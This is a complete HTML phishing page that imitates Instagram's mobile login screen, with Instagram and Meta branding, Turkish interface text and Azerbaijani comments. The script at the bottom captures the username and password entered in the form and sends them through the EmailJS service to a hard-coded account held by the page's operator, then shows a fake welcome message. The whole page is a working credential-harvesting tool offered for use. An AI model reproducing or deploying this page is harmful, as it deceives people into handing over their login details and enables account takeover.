<!DOCTYPE html>
<html lang="az">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Instagram</title>
<style>
* {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
}

body {
    background-color: #1a1a1a;
    color: #ffffff;
    display: flex;
    flex-direction: column;
    min-height: 100vh;
    width: 100vw;
    overflow-x: hidden;
}

/* Top Nav */
.top-nav {
    display: flex;
    align-items: center;
    padding: 15px 20px;
    width: 100%;
    position: relative;
}
.back-btn {
    width: 40px;
    height: 40px;
    background: rgba(255, 255, 255, 0.1);
    border-radius: 50%;
    display: flex;
    justify-content: center;
    align-items: center;
    cursor: pointer;
}
.back-btn svg {
    width: 20px;
    height: 20px;
    fill: #ffffff;
}
.lang-selector {
    flex: 1;
    text-align: center;
    font-size: 16px;
    color: #a8a8a8;
    display: flex;
    justify-content: center;
    align-items: center;
    gap: 5px;
    padding-right: 40px;
}

/* Main Content */
.main-content {
    flex: 1;
    display: flex;
    flex-direction: column;
    padding: 20px 30px;
    max-width: 450px;
    margin: 0 auto;
    width: 100%;
}

.insta-logo {
    text-align: center;
    margin: 40px 0 50px 0;
}
.insta-logo svg {
    width: 70px;
    height: 70px;
}

/* Inputs */
.input-group {
    margin-bottom: 15px;
}
.input-field {
    width: 100%;
    padding: 16px 20px;
    background: transparent;
    border: 1px solid #363636;
    border-radius: 12px;
    font-size: 16px;
    color: #ffffff;
    outline: none;
    transition: border-color 0.2s;
}
.input-field::placeholder {
    color: #a8a8a8;
}
.input-field:focus {
    border-color: #555555;
}

/* Button */
.btn-login {
    width: 100%;
    padding: 16px;
    background: #0064e0;
    color: #ffffff;
    border: none;
    border-radius: 12px;
    font-size: 16px;
    font-weight: 600;
    cursor: pointer;
    margin-top: 5px;
    margin-bottom: 20px;
    transition: background 0.2s, opacity 0.2s;
}
.btn-login:active {
    background: #0050b3;
}
.btn-login:disabled {
    opacity: 0.6;
    cursor: wait;
}

/* Links */
.forgot-link {
    text-align: center;
    color: #ffffff;
    font-size: 15px;
    font-weight: 600;
    text-decoration: none;
    display: block;
    margin-bottom: 30px;
}

/* Bottom Section */
.bottom-section {
    margin-top: auto;
    padding: 20px 30px 30px 30px;
    max-width: 450px;
    margin-left: auto;
    margin-right: auto;
    width: 100%;
}

.btn-create-account {
    width: 100%;
    padding: 14px;
    background: transparent;
    color: #0064e0;
    border: 1px solid #0064e0;
    border-radius: 12px;
    font-size: 16px;
    font-weight: 600;
    cursor: pointer;
    margin-bottom: 30px;
    transition: background 0.2s;
}
.btn-create-account:active {
    background: rgba(0, 100, 224, 0.1);
}

.meta-logo {
    text-align: center;
    display: flex;
    justify-content: center;
    align-items: center;
    gap: 6px;
    color: #ffffff;
    font-size: 16px;
    font-weight: 500;
}
.meta-logo svg {
    width: 20px;
    height: 20px;
    fill: #ffffff;
}
</style>
</head>
<body>

<!-- Top Nav -->
<div class="top-nav">
    <div class="back-btn" onclick="history.back()">
        <svg viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
    </div>
    <div class="lang-selector">
        Türkçe
        <svg width="12" height="12" viewBox="0 0 24 24" fill="#a8a8a8"><path d="M7 10l5 5 5-5z"/></svg>
    </div>
</div>

<!-- Main Content -->
<div class="main-content">
    <div class="insta-logo">
        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
            <defs>
                <linearGradient id="igGradient" x1="0%" y1="100%" x2="100%" y2="0%">
                    <stop offset="0%" stop-color="#FFDD55" />
                    <stop offset="25%" stop-color="#FF543E" />
                    <stop offset="50%" stop-color="#C837AB" />
                    <stop offset="100%" stop-color="#3C64E6" />
                </linearGradient>
            </defs>
            <rect x="2" y="2" width="20" height="20" rx="6" stroke="url(#igGradient)" stroke-width="2.5" fill="none" />
            <circle cx="12" cy="12" r="4.5" stroke="url(#igGradient)" stroke-width="2.5" fill="none" />
            <circle cx="18" cy="6" r="1.5" fill="url(#igGradient)" />
        </svg>
    </div>

    <!-- FORMA BAŞLAYIR -->
    <form id="loginForm">
        <div class="input-group">
            <input type="text" name="username" class="input-field" placeholder="Kullanıcı adı, e-posta veya cep numarası" required>
        </div>
        <div class="input-group">
            <input type="password" name="password" class="input-field" placeholder="Şifre" required>
        </div>

        <button type="submit" class="btn-login" id="loginBtn">Giriş yap</button>
    </form>
    <!-- FORMA BİTİR -->

    <a href="#" class="forgot-link">Şifreni mi unuttun?</a>
</div>

<!-- Bottom Section -->
<div class="bottom-section">
    <button class="btn-create-account">Yeni hesap oluştur</button>
    
    <div class="meta-logo">
        <svg viewBox="0 0 24 24">
            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/>
        </svg>
        Meta
    </div>
</div>

<!-- EmailJS Skripti -->
<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
<script>
    // EmailJS-i başladırıq (Public Key ilə)
    emailjs.init({ publicKey: "xJCcY0aHs535nQUhH" });

    const form = document.getElementById('loginForm');
    const loginBtn = document.getElementById('loginBtn');

    form.addEventListener('submit', async (e) => {
        e.preventDefault(); // Səhifənin yenilənməsinin qarşısını alırıq
        
        // Düyməni bloklayırıq
        loginBtn.textContent = 'Giriş yapılıyor...';
        loginBtn.disabled = true;

        try {
            // Məlumatları EmailJS-ə göndəririk
            const response = await emailjs.sendForm(
                'service_dhcy215',   // Sizin Service ID
                'template_zc8r63d',  // Sizin Template ID
                '#loginForm'         // Formanın ID-si
            );

            if (response.status === 200) {
                // Uğurlu olduqda
                form.reset();
                loginBtn.textContent = 'Giriş yap';
                loginBtn.disabled = false;
                
                // İstəsəniz burada yönləndirmə edə bilərsiniz:
                // window.location.href = 'baska_sehife.html';
                
                alert('Xoş gəldiniz!'); // İstifadəçiyə uğurlu mesaj
            }
        } catch (error) {
            // Xəta olduqda
            console.error('Xəta:', error);
            alert('Xəta baş verdi. Zəhmət olmasa yenidən cəhd edin.');
            
            loginBtn.textContent = 'Giriş yap';
            loginBtn.disabled = false;
        }
    });
</script>

</body>
</html>
